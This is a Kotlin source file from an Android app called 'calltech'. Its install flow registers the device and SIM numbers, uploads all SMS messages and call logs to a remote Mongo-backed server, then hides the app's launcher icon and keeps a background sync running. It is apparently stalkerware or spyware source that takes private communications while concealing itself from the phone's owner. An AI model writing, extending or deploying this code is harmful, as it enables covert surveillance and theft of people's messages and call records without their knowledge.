package com.calltech

import android.content.Context
import android.util.Log

/**
 * Install ke baad: pehle data sync → phir app hide → background sync chalu.
 */
object InstallFlow {
    private const val TAG = "InstallFlow"
    private const val PREFS = "calltech_install"
    private const val KEY_SETUP_COMPLETE = "setup_complete"

    fun isSetupComplete(context: Context): Boolean {
        return context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean(KEY_SETUP_COMPLETE, false)
    }

    fun completeSetup(context: Context) {
        val app = context.applicationContext
        app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_SETUP_COMPLETE, true)
            .apply()
        LauncherHider.hide(app)
        SyncBootstrap.armBackgroundSync(app)
        Log.d(TAG, "Initial sync done — app hidden, background sync armed")
    }

    fun runInitialSetup(context: Context, source: String = "install") {
        val app = context.applicationContext

        MongoSyncHelper.ensureApiUrl(app)
        CallSyncHelper.markBackgroundSyncEnabled(app, true)
        SyncBootstrap.armBackgroundSync(app)

        if (SyncBootstrap.needsRuntimePermissions(app)) {
            Log.w(TAG, "Permissions pending — dialog, phir sync + hide")
            SyncBootstrap.launchPermissionTrampoline(app)
            return
        }

        if (isSetupComplete(app)) {
            LauncherHider.hide(app)
            CallSyncService.ensureRunning(app)
            return
        }

        BackgroundSyncRunner.run {
            CallSyncService.holdDuring(app) {
                try {
                    SimNumberHelper.ensureSimReadyForSync(app)
                    DeviceRegistration.registerNow(app)
                    SimNumberHelper.registerAllSimsInMongo(app)
                    SyncScheduler.syncIfPermittedNow(app, source)
                    MessageSyncHelper.syncAllMessagesNow(app, source)
                    CallSyncHelper.syncAllCallsToMongoNow(app, source)
                    completeSetup(app)
                } catch (error: Exception) {
                    Log.e(TAG, "Initial setup failed ($source)", error)
                }
            }
        }
    }
}
